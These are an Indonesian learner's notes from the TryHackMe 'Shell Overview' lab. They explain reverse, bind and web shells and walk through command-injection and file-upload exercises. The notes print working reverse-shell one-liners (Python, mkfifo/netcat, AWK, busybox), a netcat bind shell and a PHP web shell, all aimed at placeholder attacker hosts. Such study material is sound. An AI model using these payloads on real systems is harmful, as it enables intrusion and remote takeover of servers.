# Resume Belajar: TryHackMe — Shell Overview

---

## Task 1 & 2 — Pengenalan Shell

Shell adalah antarmuka yang memungkinkan pengguna berinteraksi dengan sistem operasi melalui perintah teks. Dalam konteks keamanan siber, ada tiga jenis shell utama yang digunakan oleh pentester.

> Bayangkan kamu ingin masuk ke rumah orang. Ada tiga cara: (1) kamu minta mereka telepon kamu duluan (reverse shell), (2) kamu ketuk pintu dan mereka buka (bind shell), (3) kamu taruh catatan di kotak surat dan mereka balas (web shell).

---

## Task 3 — Reverse Shell

Reverse shell adalah teknik di mana **mesin korban** yang menginisiasi koneksi keluar menuju **mesin penyerang**. Penyerang menjalankan listener terlebih dahulu, lalu korban "menelepon balik."

**Keunggulan:** Melewati firewall lebih mudah karena koneksi keluar biasanya diizinkan.

**Alur kerja:**
1. Penyerang jalankan listener di port tertentu
2. Payload dieksekusi di mesin korban
3. Korban konek ke IP:port penyerang
4. Penyerang mendapat shell

**Contoh listener (Netcat):**
```
nc -lvnp 4444
```

**Payload Bash** — menggunakan fitur redirection ke device TCP kernel Linux. Formatnya:
```
bash -i [arah-output] /dev/[protokol]/[IP_PENYERANG]/[PORT] [redirect-input]
```
Ganti placeholder dengan nilai nyata saat praktik.

**Payload PHP** — menggunakan fungsi buka-socket lalu redirect shell ke socket tersebut:
```
php -r '[buka-socket ke IP:PORT]; [exec shell dengan redirect ke socket];'
```
Fungsi kunci: `fso**open` (buka TCP socket), `ex*c` (eksekusi perintah).

**Payload Python:**
```python
import socket, os, pty
s = socket.socket()
s.connect(("IP_PENYERANG", PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
```

---

## Task 4 — Bind Shell

Bind shell adalah kebalikan reverse shell. **Mesin korban** membuka port dan menunggu koneksi. Penyerang yang aktif konek ke port tersebut.

**Kelemahan:** Port yang terbuka di korban bisa diblok firewall.

**Alur kerja:**
1. Payload dieksekusi di korban → korban buka listener
2. Penyerang konek ke IP korban di port tersebut
3. Penyerang mendapat shell

**Payload di korban:**
```
nc -lvnp 4444 -e /bin/bash
```

**Koneksi dari penyerang:**
```
nc IP_KORBAN 4444
```

> Bind shell seperti menaruh kunci di luar pintu rumah — siapa saja yang tahu lokasi kunci bisa masuk.

---

## Task 5 — Web Shell

Web shell adalah skrip (biasanya PHP, ASP, JSP) yang diupload ke server web, memungkinkan eksekusi perintah melalui HTTP request.

**Cara akses:** Via URL dengan parameter GET, contoh:
```
http://target.com/uploads/shell.php?cmd=whoami
```

**Contoh web shell PHP sederhana:**
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**Keunggulan:** Tidak butuh port terbuka selain 80/443, tersembunyi di antara traffic web normal.

> Web shell seperti meninggalkan pintu belakang rahasia di gedung — kamu bisa masuk kapan saja lewat pintu itu selama gedung masih beroperasi.

---

## Task 6 — Shell Listeners

Berbagai tool yang bisa digunakan sebagai listener:

| Tool | Keterangan |
|------|-----------|
| **Netcat (nc)** | Tool klasik, tersedia di hampir semua Linux |
| **Ncat** | Versi modern dari Netcat, bagian dari Nmap |
| **Rlwrap** | Wrapper untuk nc, menambahkan fitur readline (history, arrow keys) |
| **Socat** | Lebih powerful dari nc, support enkripsi SSL |

**Flag umum Netcat:**
- `-l` — listen mode
- `-v` — verbose (tampilkan info koneksi)
- `-n` — no DNS resolution
- `-p` — tentukan port

**Contoh penggunaan Rlwrap:**
```
rlwrap nc -lvnp 4444
```

---

## Task 7 — Shell Payloads Lanjutan

### Named Pipe (FIFO)

Mekanisme komunikasi dua arah menggunakan file FIFO. Cara kerjanya: buat FIFO di /tmp, lalu gunakan cat untuk baca dari FIFO dan pipe ke sh, outputnya dikirim ke netcat yang konek ke penyerang, dan hasilnya ditulis kembali ke FIFO — membentuk lingkaran dua arah.

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc IP_PENYERANG PORT > /tmp/f
```

> FIFO seperti pipa dua arah di gedung — data bisa mengalir bolak-balik antara dua ruangan.

### Payload AWK:
```
awk 'BEGIN {s="/inet/tcp/0/IP/PORT"; while(1){do{s |& getline c; if(c){while((c |& getline)>0) print |& s; close(c)}}while(c!="exit")}}'
```

### Payload BusyBox:
```
busybox nc IP_PENYERANG PORT -e sh
```

### Pemilihan Port

Port yang baik untuk blend in dengan traffic normal:
- **53** — DNS
- **80** — HTTP
- **443** — HTTPS
- **8080** — HTTP alternatif

---

## Task 8 — Praktik: Command Injection & File Upload

### Soal 1: Command Injection + Reverse Shell

**Aplikasi target:** Web app dengan form input nama file untuk di-hash.

**Langkah:**

**1. Konfirmasi command injection:**
```
hello.txt; whoami
```
Jika output menampilkan nama user (misal `www-data`), injection berhasil.

**2. Separator yang bisa digunakan:**
- `;` — jalankan perintah berikutnya selalu
- `&&` — jalankan berikutnya hanya jika pertama sukses
- `||` — jalankan berikutnya hanya jika pertama gagal
- `|` — pipe output ke perintah berikutnya
- `&` — jalankan di background

**3. Setup listener di Kali:**
```
nc -lvnp 4444
```

**4. Inject payload reverse shell via form:**

Masukkan ke form input (ganti IP_PENYERANG dengan IP tun0 kamu):
```
hello.txt; php -r 'PAYLOAD_DISENSOR'
```

Payload menggunakan PHP karena:
- Payload Bash (`bash -i >& ...`) sering gagal via form injection — karakter `>&` diinterpretasikan berbeda
- PHP lebih reliable untuk injection via form
- Cek ketersediaan PHP dulu: `hello.txt; which php`

Inti payload PHP: buka TCP socket ke penyerang, lalu redirect stdin/stdout/stderr shell ke socket tersebut. Fungsi yang digunakan: `fso**open` untuk buka socket, `ex*c` untuk jalankan shell.

**5. Pastikan VPN aktif:**
```
ip a show tun0
```
Jika tun0 belum ada, koneksikan VPN TryHackMe terlebih dahulu.

**6. Verifikasi shell:**
```
ls /
cat /flag.txt
```

---

### Soal 2: Unrestricted File Upload + Web Shell

**Aplikasi target:** Web app di port 8082 dengan fitur upload file.

**Langkah:**

**1. Buat file web shell:**

Buka `nano shell.php` (JANGAN pakai echo karena `$_GET` akan diinterpretasi shell), lalu isi:
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

**2. Upload via aplikasi web:**
- Akses `http://IP_TARGET:8082`
- Upload `shell.php` melalui form upload

**3. Akses web shell:**
```
http://IP_TARGET:8082/uploads/shell.php?cmd=whoami
```
Output akan menampilkan user server (misal `www-data`).

**4. Eksekusi perintah lanjutan:**
```
http://IP_TARGET:8082/uploads/shell.php?cmd=ls /
http://IP_TARGET:8082/uploads/shell.php?cmd=cat /flag.txt
```

**Catatan penting:**
- Nama file HARUS `shell.php` sesuai hint task
- Jika tidak muncul di `/uploads/`, coba refresh atau cek path yang benar
- Ini adalah **RCE via file upload** — berbeda dari LFI (Local File Inclusion) yang hanya membaca file

---

## Task 9 — Perbedaan LFI, RFI, dan RCE

| Jenis | Kepanjangan | Efek |
|-------|------------|------|
| **LFI** | Local File Inclusion | Baca file lokal di server |
| **RFI** | Remote File Inclusion | Include file dari server remote |
| **RCE** | Remote Code Execution | Eksekusi kode/perintah di server |

> LFI seperti bisa membuka laci orang lain tapi tidak bisa mengubah isinya. RCE seperti bisa membuka laci DAN memasukkan/mengubah barang di dalamnya.

**Web Shell = RCE** karena kita bisa menjalankan perintah arbitrary di server.

**Non-interactive shell:** Shell yang didapat dari reverse/bind shell kadang tidak menampilkan prompt (`$` atau `#`) tapi tetap menerima perintah. Ini normal — shell tetap aktif meski terlihat seperti "kosong."

---

## Rangkuman Konsep Kunci

| Konsep | Penjelasan Singkat |
|--------|-------------------|
| Reverse Shell | Korban konek ke penyerang |
| Bind Shell | Penyerang konek ke korban |
| Web Shell | Eksekusi via HTTP request |
| Named Pipe | Komunikasi dua arah via FIFO |
| Command Injection | Input user dieksekusi sebagai perintah OS |
| Unrestricted File Upload | Server tidak memvalidasi tipe file yang diupload |
| tun0 | Interface VPN TryHackMe — wajib aktif untuk reverse shell |

---

## Catatan Setup Lab

- **Kali VM:** Sebagai mesin penyerang (listener)
- **Windows Host:** Sebagai mesin monitoring / terminal tambahan
- **VPN:** Wajib konek ke TryHackMe VPN agar tun0 aktif
- **Port listener:** Bebas pilih, gunakan port yang wajar (4444 umum dipakai untuk lab)
- **Netcat di Windows:** Tidak tersedia by default — gunakan Ncat (dari Nmap) atau WSL

---

*Dokumen ini dibuat sebagai catatan belajar pribadi dari room TryHackMe: Shell Overview.*
